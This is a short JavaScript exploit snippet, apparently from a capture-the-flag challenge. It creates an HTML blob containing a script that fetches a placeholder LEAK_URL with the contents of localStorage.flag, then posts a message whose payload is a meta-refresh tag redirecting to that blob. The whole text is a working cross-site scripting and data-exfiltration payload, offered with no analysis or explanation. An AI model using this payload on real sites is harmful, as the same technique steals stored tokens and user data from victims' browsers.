let blob = new Blob(["<script>fetch('LEAK_URL/?' + localStorage.flag)</script>"], {type: 'text/html'});

console.log(self.postMessage({ type: "error", msg:`<meta http-equiv="refresh" content="0; url=${URL.createObjectURL(blob)}" />` }))
